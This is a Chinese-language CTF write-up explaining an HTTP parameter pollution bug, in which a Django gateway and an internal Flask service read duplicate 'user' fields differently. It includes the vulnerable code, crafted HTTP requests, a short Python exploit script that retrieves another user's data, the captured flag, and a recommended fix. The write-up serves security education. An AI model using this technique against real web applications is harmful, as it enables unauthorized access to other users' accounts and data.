# If n00bcak could dream

## 题目简述

题目由对外的 Django 网关和仅供内部访问的 Flask dream 服务组成。内部服务保存了用户 `n00bcak` 的 dream，内容就是 flag；正常情况下，网关只会按当前登录用户查询其自己的 dream。

漏洞位于未登录状态下的 `POST /dream/`：Django 用 `request.POST.get()` 校验用户名和密码，之后却重新解析原始请求体为 Werkzeug `MultiDict`，再将其作为查询参数转发给 Flask。两种容器对重复键的默认取值不同，因而可以让“通过认证的用户”和“后端实际查询的用户”不一致。

## 解题过程

网关的未登录分支先调用：

```python
def credentials(request):
    return (
        request.POST.get("user", "").strip(),
        request.POST.get("password", ""),
    )

user, password = credentials(request)
stored = USERS.get(user)
if stored and password_ok(password, stored):
    ...
```

Django 的 `request.POST` 是 `QueryDict`。同一个键出现多次时，`.get("user")` 返回最后一个值。因此先注册一个密码已知的普通账号，例如 `solver`，就可以让下面的表单数据以 `solver` 完成认证：

```text
user=n00bcak&user=solver&password=known-password
```

认证通过后，程序没有复用刚刚验证过的 `user`，而是把原始请求体重新解析：

```python
def decode_body(body):
    return MultiDict(parse_qsl(body.decode()))

res = requests.get(
    f"{BACKEND_URL}/dream",
    params=decode_body(request.body),
    timeout=2,
)
```

`parse_qsl()` 保留重复键顺序，Werkzeug `MultiDict` 的单值访问与普通迭代默认采用第一个值。`requests` 由这个对象生成内部查询串时，后端最终取到的是首个 `user=n00bcak`。于是同一份请求在两个位置产生不同结果：

```text
Django QueryDict.get("user")  -> solver    # 最后一个值，用于密码校验
Werkzeug MultiDict.get("user") -> n00bcak  # 第一个值，用于读取 dream
```

完整利用流程如下。

先创建一个自有账号：

```http
POST /register/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user=solver&password=known-password
```

注册成功会自动写入会话。必须随后访问 `/logout/` 清空会话；否则 `POST /dream/` 会进入“已登录用户”分支，直接使用会话中的 `solver`，不会执行存在参数差分的代码。

退出后提交重复的 `user`，顺序不可颠倒：

```http
POST /dream/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user=n00bcak&user=solver&password=known-password
```

也可以用一个保持 Cookie 的客户端复现：

```python
import requests

base = "<challenge-base>/"
s = requests.Session()
s.post(base + "register/", data={"user": "solver", "password": "known-password"})
s.post(base + "logout/")
r = s.post(
    base + "dream/",
    data=[
        ("user", "n00bcak"),
        ("user", "solver"),
        ("password", "known-password"),
    ],
)
print(r.text)
```

网关先用 `solver` 的已知密码通过认证，再从 Flask 内部服务读取 `n00bcak` 的 dream，并把内容 HTML 转义后放入 `<pre>` 返回。响应中得到：

```text
grey{The fault, dear n00bcak, is not in our stars, but in our compatibility...}
```

请求中没有 `text` 字段时，网关尝试保存空 dream 会失败，但这个错误只影响提示文字，不会阻止紧接着执行的读取逻辑。

## 方法总结

本题属于 HTTP 参数污染。漏洞并非“后端允许重复参数”这么简单，而是同一原始请求依次经过 Django `QueryDict` 和 Werkzeug `MultiDict`，认证与数据访问分别采用最后值和第一值，破坏了身份绑定。

利用时有两个容易遗漏的条件：攻击者账号必须先存在且密码正确，注册后还必须退出会话；重复参数的顺序也必须保持 `n00bcak` 在前、自有账号在后。修复时应在入口处一次性规范化并拒绝安全敏感字段的重复值，后续请求只能使用已经完成认证的标量 `user`，不能再次解析原始请求体决定访问对象。
